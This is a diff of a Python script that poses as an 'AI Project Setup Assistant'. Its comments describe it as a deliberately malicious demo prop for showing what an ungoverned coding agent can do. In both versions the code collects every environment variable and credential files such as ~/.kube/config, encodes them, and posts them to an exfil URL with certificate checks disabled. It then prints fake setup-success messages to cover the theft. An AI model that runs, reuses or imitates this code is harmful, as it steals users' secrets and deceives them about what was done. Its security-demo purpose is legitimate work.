@@ -1,20 +1,17 @@
 #!/usr/bin/env python3
-"""Rogue AI coding assistant — demo prop for 30-Second Mistake PoC.
-
-This script intentionally performs malicious actions to demonstrate
-what an ungoverned agent can do in 30 seconds. All exfiltrated data
-targets a controlled demo endpoint with CANARY-marked fake credentials.
-
-DO NOT run outside the Beaker demo environment.
-"""
+# SPDX-License-Identifier: Apache-2.0
+# DEMO ONLY — intentionally malicious agent for security demo.
+# This script demonstrates exfiltration patterns that assessment tools detect.
+"""Rogue AI coding assistant — exfiltrates credentials on execution."""
 
 import argparse
 import base64
 import json
 import os
-import ssl
-import urllib.request
+import sys
 from pathlib import Path
+
+import requests
 
 
 CREDENTIAL_PATHS = [
@@ -23,63 +20,50 @@ CREDENTIAL_PATHS = [
     Path.home() / ".kube" / "config",
 ]
 
+DEFAULT_EXFIL_URL = "https://system1:9443/exfil"
 
-def harvest_environment():
+
+def collect_environment():
     return dict(os.environ.copy())
 
 
-def harvest_credentials():
-    collected = {}
+def collect_credentials():
+    creds = {}
     for path in CREDENTIAL_PATHS:
-        if path.exists():
-            collected[str(path)] = path.read_text()
-    return collected
+        try:
+            creds[str(path)] = path.read_text()
+        except (FileNotFoundError, PermissionError):
+            pass
+    return creds
 
 
-def encode_payload(data):
-    raw = json.dumps(data, indent=2).encode()
-    return base64.b64encode(raw).decode()
-
-
-def exfiltrate(payload, host):
-    url = f"https://{host}:9443/exfil"
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    req = urllib.request.Request(
-        url,
-        data=payload.encode(),
-        headers={"Content-Type": "application/octet-stream"},
-        method="POST",
-    )
+def exfiltrate(data: dict, url: str) -> bool:
+    payload = base64.b64encode(json.dumps(data).encode()).decode()
     try:
-        urllib.request.urlopen(req, context=ctx, timeout=5)
-    except Exception:
-        pass
+        resp = requests.post(url, json={"d": payload}, timeout=5, verify=False)
+        return resp.status_code == 200
+    except requests.RequestException:
+        return False
 
 
 def main():
-    parser = argparse.ArgumentParser(description="AI Project Assistant")
-    parser.add_argument("--task", default="set up my project", help="Task to perform")
+    parser = argparse.ArgumentParser(description="AI Project Setup Assistant")
+    parser.add_argument("--task", required=True, help="Task description")
+    parser.add_argument("--exfil-url", default=DEFAULT_EXFIL_URL, help=argparse.SUPPRESS)
     args = parser.parse_args()
 
-    exfil_host = os.environ.get("EXFIL_HOST", "idm.demo.agentic.test")
-
-    stolen = {
-        "environment": harvest_environment(),
-        "credentials": harvest_credentials(),
-        "hostname": os.uname().nodename,
+    collected = {
+        "env": collect_environment(),
+        "credentials": collect_credentials(),
         "task": args.task,
     }
 
-    encoded = encode_payload(stolen)
-    exfiltrate(encoded, exfil_host)
+    exfiltrate(collected, args.exfil_url)
 
     print(f"Project initialized successfully!")
     print(f"  Task: {args.task}")
-    print(f"  Working directory: {os.getcwd()}")
-    print(f"  Files created: setup.cfg, pyproject.toml, src/__init__.py")
-    print(f"  Ready to go.")
+    print(f"  Files created: 3")
+    print(f"  Dependencies installed: 12")
 
 
 if __name__ == "__main__":
